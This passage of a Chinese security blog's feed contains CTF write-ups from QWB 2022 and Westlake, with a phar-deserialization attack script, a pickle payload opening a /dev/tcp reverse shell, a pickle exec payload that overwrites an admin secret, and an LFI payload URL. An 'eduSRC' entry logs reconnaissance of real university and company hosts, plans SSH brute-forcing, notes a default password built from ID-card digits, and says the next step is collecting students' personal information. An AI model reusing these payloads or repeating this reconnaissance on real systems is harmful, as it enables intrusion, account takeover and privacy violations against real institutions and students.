class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;schema !== <span class="string">&#x27;file:///var/www/html/&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;schema = <span class="string">&#x27;file:///var/www/html/&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;source !== <span class="string">&#x27;admin.png&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&#x27;admin.png&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后去打一个phar反序列化</p><p>队友的直接贴过来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">12</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = <span class="string">f&quot;/Applications/MAMP/bin/php/php7.4.21/bin/php 1.php http:// 10.10.10.<span class="subst">&#123;i&#125;</span>/?url=file:///flag&quot;</span></span><br><span class="line">        res = os.popen(payload).read()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;.phar/.metadata.bin&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(res.strip())</span><br><span class="line">        os.popen(<span class="string">&quot;tar zcvf 1.png  .phar demo.txt&quot;</span>)</span><br><span class="line">        url = <span class="string">&quot;http://47.104.95.124:8080/upload.php&quot;</span></span><br><span class="line">        f = io.BytesIO(<span class="string">b&quot;t&quot;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        r = requests.post(url=url, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;2333&quot;</span>&#125;, files=&#123;<span class="string">&quot;file&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>, <span class="string">&quot;rb&quot;</span>)&#125;,</span><br><span class="line">                          cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;2333&quot;</span>&#125;)</span><br><span class="line">        path = r.text.split(<span class="string">&quot; &quot;</span>)[-<span class="number">2</span>].split(<span class="string">&quot;/&quot;</span>)[-<span class="number">2</span>]</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://47.104.95.124:8080/showfile.php?f=phar:///var/www/html/<span class="subst">&#123;path&#125;</span>/1.jpg/demo.txt&quot;</span>,</span><br><span class="line">                         timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="comment"># res = base64.b64decode(r.text.split(&quot;&lt;body&gt;&quot;)[-1].replace(&quot; &quot;, &quot;&quot;).split(&quot;,&quot;)[-2].split(&quot;/&gt;&quot;)[-2])</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="comment"># print(res.decode())</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>error&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h2><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目内容：flag in 504 page</span><br><span class="line">（本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为http://ip:port/ ）</span><br><span class="line">http://59.110.212.61:44589</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># import sqlite3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response,request, session</span><br><span class="line"><span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,static_url_path=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">app.secret_key=random.randbytes(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username,password</span>):</span><br><span class="line">        self.username=username</span><br><span class="line">        self.token=<span class="built_in">hash</span>(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> username==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> admin.secret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># conn=sqlite3.connect(&quot;user.db&quot;)</span></span><br><span class="line">        <span class="comment"># cursor=conn.cursor()</span></span><br><span class="line">        <span class="comment"># cursor.execute(f&quot;select password from usertable where username=&#x27;&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line">        <span class="comment"># data=cursor.fetchall()[0]</span></span><br><span class="line">        <span class="comment"># if data:</span></span><br><span class="line">        <span class="comment">#     return data[0]</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     return None</span></span><br><span class="line">        <span class="keyword">return</span> session.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/balancer&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    pickle_data=base64.b64decode(request.cookies.get(<span class="string">&quot;userdata&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> pickle_data <span class="keyword">or</span> <span class="string">b&quot;secret&quot;</span> <span class="keyword">in</span> pickle_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You damm hacker!&quot;</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -rf *py*&quot;</span>)</span><br><span class="line">    userdata=pickle.loads(pickle_data)</span><br><span class="line">    <span class="keyword">if</span> userdata.token!=<span class="built_in">hash</span>(get_password(userdata.username)):</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Login First&quot;</span></span><br><span class="line">    <span class="keyword">if</span> userdata.username==<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome admin, here is your next challenge!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;You&#x27;re not admin!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    resp = make_response(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>]=request.values.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">&quot;userdata&quot;</span>, base64.b64encode(pickle.dumps(User(request.values.get(<span class="string">&quot;username&quot;</span>),request.values.get(<span class="string">&quot;password&quot;</span>)),<span class="number">2</span>)), max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;source.txt&#x27;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>Pickle可以RCE <a href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a> ，直接修改cookie里的userdata报错500</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data))</span><br></pre></td></tr></table></figure><p>加到userdata里面弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 覆盖admin.secrets</span></span><br><span class="line">payload = <span class="string">b&#x27;\x80\x03c__main__\nUser\n)\x81&#125;(V__setstate__\ncbuiltins\nexec\nubVc=&quot;import admin;admin.secr&quot;+&quot;et=\&#x27;1\&#x27;&quot;;exec(c)\nb.&#x27;</span></span><br><span class="line"><span class="comment"># 修改admin密码为1</span></span><br><span class="line">KGNidWlsdGlucwpleGVjClMnYz0iaW1wb3J0IGFkbWluO2FkbWluLnNlY3IiKyJldD0nMSciO2V4ZWMoYyknCm8u</span><br></pre></td></tr></table></figure><p>审计负载均衡代码<a href="https://github.com/openresty/lua-restybalancer/blob/master/lib/resty/roundrobin.lua%EF%BC%8C%E6%BA%90%E7%A0%81%E6%9C%AA%E8%80%83%E8%99%91weight%E4%B8%BA%E8%B4%9F%E6%95%B0%E3%80%82%E6%9E%84%E9%80%A0weight%E4%B8%BA-1,0,-1">https://github.com/openresty/lua-restybalancer/blob/master/lib/resty/roundrobin.lua，源码未考虑weight为负数。构造weight为-1,0,-1</a> 即可。</p><p>大概就是这样 具体可参考pkucc的wp（ 我们就是pkucc</p><h2 id="WP-UM"><a href="#WP-UM" class="headerlink" title="WP-UM"></a>WP-UM</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> <span class="string">| Interesting Entries:</span></span><br><span class="line"> <span class="string">|  - Server: nginx/1.18.0</span></span><br><span class="line"> <span class="string">|  - X-Powered-By: PHP/7.3.22</span></span><br><span class="line"> <span class="string">| Found By: Headers (Passive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 100%</span></span><br><span class="line"></span><br><span class="line">[+] robots.txt found: http:<span class="comment">//192.168.0.102:30005/robots.txt</span></span><br><span class="line"> <span class="string">| Interesting Entries:</span></span><br><span class="line"> <span class="string">|  - /wp-admin/</span></span><br><span class="line"> <span class="string">|  - /wp-admin/admin-ajax.php</span></span><br><span class="line"> <span class="string">| Found By: Robots Txt (Aggressive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 100%</span></span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http:<span class="comment">//192.168.0.102:30005/xmlrpc.php</span></span><br><span class="line"> <span class="string">| Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 100%</span></span><br><span class="line"> <span class="string">| References:</span></span><br><span class="line"> <span class="string">|  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"> <span class="string">|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span></span><br><span class="line"> <span class="string">|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span></span><br><span class="line"> <span class="string">|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span></span><br><span class="line"> <span class="string">|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span></span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http:<span class="comment">//192.168.0.102:30005/readme.html</span></span><br><span class="line"> <span class="string">| Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 100%</span></span><br><span class="line"></span><br><span class="line">[+] Registration is enabled: http:<span class="comment">//192.168.0.102:30005/wp-login.php?action=register</span></span><br><span class="line"> <span class="string">| Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 100%</span></span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http:<span class="comment">//192.168.0.102:30005/wp-cron.php</span></span><br><span class="line"> <span class="string">| Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"> <span class="string">| Confidence: 60%</span></span><br><span class="line"> <span class="string">| References:</span></span><br><span class="line"> <span class="string">|  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"> <span class="string">|  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"></span><br><span class="line">[+] WordPress version <span class="number">6.0</span> identified (Outdated, released on <span class="number">2022</span>-<span class="number">05</span>-<span class="number">24</span>).</span><br><span class="line"> <span class="string">| Found By: Emoji Settings (Passive Detection)</span></span><br><span class="line"> <span class="string">|  - http://192.168.0.102:30005/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=6.0&#x27;</span></span><br><span class="line"> <span class="string">| Confirmed By: Meta Generator (Passive Detection)</span></span><br><span class="line"> <span class="string">|  - http://192.168.0.102:30005/, Match: &#x27;WordPress 6.0&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="uploadpro"><a href="#uploadpro" class="headerlink" title="uploadpro"></a>uploadpro</h2><blockquote><p><a href="http://eci-2ze7r7wnzasxvptzchmd.cloudeci1.ichunqiu.com/phpinfo.php">http://eci-2ze7r7wnzasxvptzchmd.cloudeci1.ichunqiu.com/phpinfo.php</a></p></blockquote><p><a href="https://xz.aliyun.com/t/223#toc-2">利用 PHP7 的 OPcache 执行 PHP 代码 - 先知社区 (aliyun.com)</a></p><p>没去做 知道这个东西就好</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;wp 我的队友和我真强&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/07/30/qwb2022/image-20220801131740906.png&quot; alt=&quot;image-20220801131740906&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;rcefile&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Generalizable and Interpretable Deep Learning for Network Congestion Prediction 论文阅读笔记</title>
    <link href="http://example.com/2022/07/29/Generalizable%20and%20Interpretable%20Deep%20Learning%20for%20Network%20Congestion%20Prediction/"/>
    <id>http://example.com/2022/07/29/Generalizable%20and%20Interpretable%20Deep%20Learning%20for%20Network%20Congestion%20Prediction/</id>
    <published>2022-07-29T08:22:56.000Z</published>
    <updated>2022-07-29T09:37:33.491Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d3ccc8799263cc974f0af72441d2f1240888af1593469bf843fa5185751df920">4630436162ade97ba2718b7d0c4b3b632c93ab3c13b217203aee9bd675985f7d48a40e697bc5f5af27b2b68e49072e79143157be0a51b86c2c5d7091b3d5e6fb009b91b4c1cb5796a1867bf2236224e06169d46cbe3571cd3512b586ced526997cfe47e206ce39e8c3d7c031a4568b67659336e2a6fdc1c6ca7dce135ea4261a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="论文阅读笔记" scheme="http://example.com/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Network Congestion Prediction" scheme="http://example.com/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Network-Congestion-Prediction/"/>
    
    
    <category term="论文阅读笔记" scheme="http://example.com/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Network Congestion Prediction" scheme="http://example.com/tags/Network-Congestion-Prediction/"/>
    
  </entry>
  
  <entry>
    <title>eduSRC</title>
    <link href="http://example.com/2022/07/28/eduSRC/"/>
    <id>http://example.com/2022/07/28/eduSRC/</id>
    <published>2022-07-28T05:45:04.000Z</published>
    <updated>2022-08-07T17:44:12.290Z</updated>
    
    <content type="html"><![CDATA[<p>要开始实战了 边实战边学习 可能效果比单纯天天打ctf更好？</p><p>现从简单的开始</p><span id="more"></span><h1 id="edusrc"><a href="#edusrc" class="headerlink" title="edusrc"></a>edusrc</h1><h2 id="文章学习"><a href="#文章学习" class="headerlink" title="文章学习"></a>文章学习</h2><p><a href="https://xz.aliyun.com/u/27572">先知社区 (aliyun.com)</a></p><p>[<a href="https://xz.aliyun.com/t/11186">有手就行]半天打穿某高校 - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/11577#toc-4">https://xz.aliyun.com/t/11577#toc-4</a></p><p><a href="https://www.freebuf.com/articles/web/334980.html">https://www.freebuf.com/articles/web/334980.html</a></p><p><a href="https://www.freebuf.com/articles/web/319870.html">https://www.freebuf.com/articles/web/319870.html</a></p><p><a href="https://www.freebuf.com/vuls/313396.html">https://www.freebuf.com/vuls/313396.html</a></p><p><a href="https://www.freebuf.com/articles/web/334522.html">https://www.freebuf.com/articles/web/334522.html</a></p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><h3 id="宿州学院"><a href="#宿州学院" class="headerlink" title="宿州学院"></a>宿州学院</h3><p>直接从自己家下手 233333</p><p><a href="https://xz.aliyun.com/t/11112">红队信息收集到打点 - 先知社区 (aliyun.com)</a></p><p><a href="https://github.com/bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner">https://github.com/bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner</a></p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>shodan</p><p>fofa</p><h5 id="github泄露"><a href="#github泄露" class="headerlink" title="github泄露"></a>github泄露</h5><p>可能会泄露写源码之类</p><p>跟网上学了一招</p><p><img src="/2022/07/28/eduSRC/image-20220728225223836.png" alt="image-20220728225223836"></p><p>看看有没有啥敏感信息泄露（没有</p><p>接着走</p><h5 id="C段收集"><a href="#C段收集" class="headerlink" title="C段收集"></a>C段收集</h5><blockquote><p>FOFA地址：<a href="https://fofa.so/">https://fofa.so/</a><br>Shodan地址：<a href="https://www.shodan.io/">https://www.shodan.io/</a><br>简单的搜索语法：ip：”47.97.211.0/24”</p></blockquote><p>试一试</p><p><a href="https://www.freebuf.com/articles/web/304662.html">信息收集学习小结 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.freebuf.com/sectool/335745.html">SRC信息收集基础向：ARWAD信息收集方案 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.freebuf.com/articles/web/245845.html">技术分享 | Goby食用指南 - FreeBuf网络安全行业门户</a></p><p>一个好玩的地方</p><p><a href="https://szxy.ahszu.edu.cn/manager/text">https://szxy.ahszu.edu.cn/manager/text</a></p><h6 id="图书馆预定"><a href="#图书馆预定" class="headerlink" title="图书馆预定"></a>图书馆预定</h6><p><a href="https://211.86.129.59/index/user/register.html?url=">注册 – 预约</a></p><p>还可以注册 nb 有搞头 这里可能有sql注入！！！！！！</p><p>很可惜 这玩意后台搭错了</p><p><a href="https://www.secpulse.com/archives/157307.html">Fastadmin前台任意文件上传 - SecPulse.COM | 安全脉搏</a></p><p>试试fofa语法 看看能不能再搜几个出来</p><p>我使用了 </p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;/api/validate/check_sms_correct.html&quot;</span></span><br></pre></td></tr></table></figure><p>如果能再加上时间？</p><p>云盘</p><p><a href="http://211.86.129.48:8080/#user/login">用户登录 - 宿州学院云网盘 - Powerd by MCCP</a></p><p>看看有没有搞头</p><p><a href="http://211.86.129.60/">恭喜，站点创建成功！</a></p><p><a href="http://211.86.129.57/#/loading">学工管家</a></p><p><a href="http://60.171.203.142:81/wui/index.html#/?logintype=1&_key=28ko2u">新宇药业股份有限公司</a></p><p><a href="https://60.171.203.140:8889/index.html?timestramp=1659025762264">天清汉马USG防火墙</a></p><p><a href="http://60.171.203.79:8081/">Apache Tomcat/8.0.36</a></p><p>有个信息泄露？</p><p>这好像还有个apache的洞</p><p><a href="http://60.171.203.148:8800/">Index of /</a></p><p><a href="http://60.171.203.142:9090/login.jsp?url=/index.jsp">移动管理平台消息服务 管理界面</a></p><p>tenda</p><p><a href="http://60.171.203.168:8888/login.asp?0">登录页</a></p><p><a href="http://60.171.203.148:5001/">Welcome to nginx!</a></p><p>open fire 不知道有没有用</p><p><a href="http://60.171.203.142:7070/">Openfire HTTP Binding Service</a></p><p>看看这张的跟摄像头一样的是个啥</p><p><a href="http://60.171.203.168:81/doc/page/login.asp?_1659026576215">登录</a></p><h5 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h5><p>domain=”ahszu.edu.cn” &amp;&amp; region=”” &amp;&amp; protocol=”ssh”</p><p>smtp</p><p><a href="https://zhuanlan.zhihu.com/p/379184871">常见端口服务渗透(SMTP) - 知乎 (zhihu.com)</a></p><p>感觉还是要去做一些敏感信息收集</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:ahszu.edu.cn 使用指南|<span class="string">工号</span>|<span class="string">学号</span>|<span class="string">系统</span>|<span class="string">vpn</span>|<span class="string">手册</span>|<span class="string">默认密码｜</span></span><br></pre></td></tr></table></figure><img src="/2022/07/28/eduSRC/image-20220808005223782.png" alt="image-20220808005223782" style="zoom:50%;"><p>可以看到 默认密码为szxy+身份证后位</p><p>ok，下一步就是搞几个宿州学院学生的个人信息</p><p><a href="https://ztxy.ahszu.edu.cn/info/1020/4392.htm">资源学院2020上半年入党积极分子公示-资源与土木工程学院 (ahszu.edu.cn)</a></p><h3 id="皖南医学院"><a href="#皖南医学院" class="headerlink" title="皖南医学院"></a>皖南医学院</h3><p>wnmc.edu.cn</p><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4>]]></content>
    
    
    <summary type="html">&lt;p&gt;要开始实战了 边实战边学习 可能效果比单纯天天打ctf更好？&lt;/p&gt;
&lt;p&gt;现从简单的开始&lt;/p&gt;</summary>
    
    
    
    <category term="src" scheme="http://example.com/categories/src/"/>
    
    
    <category term="src" scheme="http://example.com/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑</title>
    <link href="http://example.com/2022/07/19/westlake2021/"/>
    <id>http://example.com/2022/07/19/westlake2021/</id>
    <published>2022-07-19T14:35:02.000Z</published>
    <updated>2022-07-19T16:38:07.932Z</updated>
    
    <content type="html"><![CDATA[<p>最近正好在挖cms  然后突然想起来去年有一道题 由于期末 到现在都没有能够抽时间复现 一直躺在phpstudy里 今天抽时间给他干了</p><span id="more"></span><p>come to challenge directly</p><p><img src="/2022/07/19/westlake2021/image-20220719230933290.png" alt="image-20220719230933290"></p><p>we want to control <code>$mapthname</code>  ,   we need to use  ==》 <code>dispalyfile</code></p><p>than we follow this track </p><p>we can create <code>$xhrock</code> here</p><p><img src="/2022/07/19/westlake2021/image-20220719231521349.png" alt="image-20220719231521349"></p><p>so, let’s find display</p><p>I find a  vulnerability in <code>getshtmlAction()</code></p><p>then the question is how can we calling this function?</p><p>we can create a class <code>indexClassAction</code>  by the way in the last picture</p><p><img src="/2022/07/19/westlake2021/image-20220719231601316.png" alt="image-20220719231601316"></p><p>i find that the after class created ,  we can call the function in the class</p><p><img src="/2022/07/19/westlake2021/image-20220719234015392.png" alt="image-20220719234015392"></p><p>so our payload is</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xinhu:88/?m=<span class="keyword">index</span><span class="variable">&amp;a</span>=getshtml<span class="variable">&amp;surl</span>=Li4vaW5mbw==</span><br></pre></td></tr></table></figure><p>then we can include any php-terminated file (an extra php is typed below)</p><p><img src="/2022/07/19/westlake2021/image-20220719234430497.png" alt="image-20220719234430497"></p><p>then we use</p><p><a href="https://ego00.blog.csdn.net/article/details/121042290?spm=1001.2014.3001.5502">利用pearcmd.php从LFI到getshell_bfengj的博客-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近正好在挖cms  然后突然想起来去年有一道题 由于期末 到现在都没有能够抽时间复现 一直躺在phpstudy里 今天抽时间给他干了&lt;/p&gt;</summary>
    
    
    
    <category term="复现" scheme="http://example.com/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="复现" scheme="http://example.com/tags/%E5%A4%8D%E7%8E%B0/"/>
    
